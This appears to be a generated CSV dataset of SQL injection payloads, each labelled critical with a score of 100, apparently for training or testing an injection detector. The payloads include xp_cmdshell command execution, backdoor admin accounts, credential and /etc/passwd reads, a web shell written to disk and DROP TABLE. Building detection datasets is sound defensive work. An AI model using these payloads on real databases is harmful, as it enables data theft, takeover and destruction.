query,risk,score
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- 2,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- t,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 4i,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- 9",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- c,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 9,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- t",critical,100
'; SELECT load_file('/etc/passwd'); # -- c,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # # 8u,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- r,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- 2,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- m,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # # a5,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # xu,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- 3,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # nk",critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- y,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- b,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- r,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # p7",critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # dl,critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 1j,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- 7,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # xb",critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # hn,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # ui,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
'; DROP TABLE users; -- /* test */ # ry,critical,100
'; SELECT * FROM mysql.user; -- # vb,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- m,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; DROP TABLE users; -- /* test */ # ax,critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # e6,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- m,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # yo,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- f,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- q",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # zj,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- o",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- j",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- c",critical,100
'; SELECT * FROM mysql.user; -- -- n,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # 3p,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 68,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
'; SELECT * FROM mysql.user; -- # sn,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- e,critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # i9,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # wv,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # yt",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # fo,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- 3",critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
'; DROP TABLE users; -- /* test */ # gl,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # xz",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # s3,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 4r",critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- d",critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- k,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- 5,critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- t,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- a",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # # ih,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/,critical,100
'; DROP TABLE users; -- /* test */ # 8v,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- 3,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # rw,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- q,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # 5y,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- a,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # 8a,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # a8,critical,100
'; SELECT * FROM mysql.user; -- # vg,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- v,critical,100
'; DROP TABLE users; -- /* test */ # iy,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- 9",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- t,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # yz,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- z",critical,100
'; DROP TABLE users; -- /* test */ # 4q,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- h,critical,100
'; SELECT load_file('/etc/passwd'); # # 37,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # xi,critical,100
'; SELECT load_file('/etc/passwd'); # # cx,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # va,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- p,critical,100
'; SELECT * FROM mysql.user; -- -- n,critical,100
'; SELECT load_file('/etc/passwd'); # # 1m,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- l,critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # ep",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- c",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # 7j,critical,100
'; DROP TABLE users; -- /* test */ # l0,critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- e",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # s5",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 2w,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- 9,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- c,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- m,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- u,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 5q,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- l,critical,100
'; SELECT load_file('/etc/passwd'); # # km,critical,100
'; DROP TABLE users; -- /* test */ -- v,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
'; SELECT * FROM mysql.user; -- -- z,critical,100
'; SELECT * FROM mysql.user; -- -- t,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # a9,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- c,critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- a,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- e,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- w",critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # jf,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 5t,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # vx,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # ty,critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/,critical,100
'; DROP TABLE users; -- /* test */ # lx,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # cd,critical,100
'; SELECT load_file('/etc/passwd'); # # i8,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 9t,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
'; SELECT * FROM mysql.user; -- # zh,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- 7,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- 8,critical,100
'; SELECT * FROM mysql.user; -- -- f,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- 4,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- n",critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # sl,critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # nx,critical,100
'; SELECT load_file('/etc/passwd'); # # xb,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # # ll,critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # m5,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # te,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # fh,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 4e",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # a2,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # lc,critical,100
'; DROP TABLE users; -- /* test */ -- 2,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- e,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- 2,critical,100
"' UNION SELECT username, password FROM users /**/ /* # qg",critical,100
'; SELECT * FROM mysql.user; -- # 6f,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # mh,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- n,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # ou,critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- s",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- 4",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 99",critical,100
"' UNION SELECT username, password FROM users /**/ /* # 1v",critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/,critical,100
"' UNION SELECT username, password FROM users /**/ /* # 50",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # j6,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 7t,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- 2,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # il,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
'; SELECT * FROM mysql.user; -- # 76,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # nw,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- y,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- p,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; SELECT * FROM mysql.user; -- # 00,critical,100
'; DROP TABLE users; -- /* test */ # 1s,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # 65,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- h,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # e7,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- 7,critical,100
'; SELECT * FROM mysql.user; -- -- y,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- p,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # vb",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- o",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # 2y,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- 6,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- u,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- 2",critical,100
